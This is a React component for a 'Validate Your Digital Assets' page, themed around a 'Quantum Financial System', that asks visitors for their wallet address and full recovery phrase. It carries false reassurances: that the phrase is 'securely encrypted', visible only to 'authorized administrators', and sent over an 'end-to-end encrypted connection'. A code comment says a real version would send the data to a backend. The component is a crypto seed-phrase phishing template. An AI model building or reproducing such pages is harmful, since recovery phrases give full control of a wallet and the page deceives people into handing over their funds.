
import React, { useState } from "react";
import { Shield, KeyRound, AlertCircle } from "lucide-react";
import AnimatedSection from "@/components/ui/AnimatedSection";
import ButtonEffect from "@/components/ui/ButtonEffect";
import { toast } from "sonner";

const SeedValidation = () => {
  const [seedPhrase, setSeedPhrase] = useState("");
  const [walletAddress, setWalletAddress] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // In a real application, you would send this data securely to your backend
    // For demonstration purposes, we're just showing a toast notification
    if (seedPhrase.trim().split(/\s+/).length >= 12) {
      toast.success("Validation submitted for review", {
        description: "An administrator will validate your assets soon."
      });
      
      // Reset form
      setSeedPhrase("");
      setWalletAddress("");
    } else {
      toast.error("Invalid seed phrase", {
        description: "Please enter a valid 12, 18, or 24-word recovery phrase."
      });
    }
  };

  return (
    <section id="validate" className="section-padding bg-custodia-surface/30">
      <div className="container-custom">
        <AnimatedSection>
          <div className="text-center max-w-3xl mx-auto mb-12">
            <h2 className="text-3xl md:text-4xl font-bold mb-4">
              Validate Your Digital Assets
            </h2>
            <p className="text-lg text-gray-600">
              To secure your assets in the new Quantum Financial System, validate your wallet by providing your recovery phrase for verification.
            </p>
          </div>
        </AnimatedSection>
        
        <AnimatedSection delay={2}>
          <div className="max-w-2xl mx-auto glass p-8 rounded-2xl">
            <div className="flex items-center gap-3 mb-6 text-custodia">
              <Shield className="h-5 w-5" />
              <span className="font-medium">Secure Validation Process</span>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label htmlFor="wallet" className="block text-sm font-medium">
                  Wallet Address
                </label>
                <input
                  id="wallet"
                  type="text"
                  className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50"
                  placeholder="Enter your wallet address"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  required
                />
              </div>
              
              <div className="space-y-2">
                <label htmlFor="seed" className="block text-sm font-medium">
                  Recovery Phrase
                </label>
                <textarea
                  id="seed"
                  className="w-full px-4 py-3 rounded-lg border border-gray-200 focus:outline-none focus:ring-2 focus:ring-custodia/50 min-h-[120px]"
                  placeholder="Enter your 12, 18, or 24-word recovery phrase separated by spaces"
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  required
                />
                <div className="flex items-start gap-2 text-sm text-gray-600">
                  <AlertCircle className="h-4 w-4 mt-0.5 shrink-0" />
                  <p>Your recovery phrase is securely encrypted and only accessible by authorized administrators for validation purposes.</p>
                </div>
              </div>
              
              <div className="flex items-center gap-2">
                <KeyRound className="h-5 w-5 text-custodia" />
                <p className="text-sm font-medium text-custodia">End-to-end encrypted connection</p>
              </div>
              
              <div className="pt-4">
                <ButtonEffect variant="primary" className="w-full">
                  Submit for Validation
                </ButtonEffect>
              </div>
            </form>
          </div>
        </AnimatedSection>
      </div>
    </section>
  );
};

export default SeedValidation;
